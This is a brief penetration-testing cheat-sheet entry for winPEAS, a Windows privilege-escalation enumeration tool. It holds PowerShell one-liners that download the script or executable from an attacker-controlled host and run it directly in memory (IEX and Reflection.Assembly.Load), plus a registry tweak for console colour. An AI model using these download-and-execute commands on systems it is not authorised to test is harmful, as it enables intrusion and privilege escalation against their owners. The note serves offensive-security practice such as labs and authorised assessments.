# winpeas

#plateform/windows #target/local #cat/RECON #tag/powershell


## _url
```
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe
```

## ps1 - oneliner
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/<dl_winpeas_path>winPEAS.ps1') | IEX
```

## exe - oneliner
https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
```powershell
$url="http://<local_ip>:<port|80>/<dl_winpeas_path>winPEASany_ofs.exe";$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("<param|-h>")
``` 

## enable color
```powershell
New-Item -Path HKCU:\Console -ErrorAction SilentlyContinue | Out-Null ; Set-ItemProperty -Path HKCU:\Console -Name VirtualTerminalLevel -Type DWord -Value 1
```


= dl_winpeas_path: win/bin/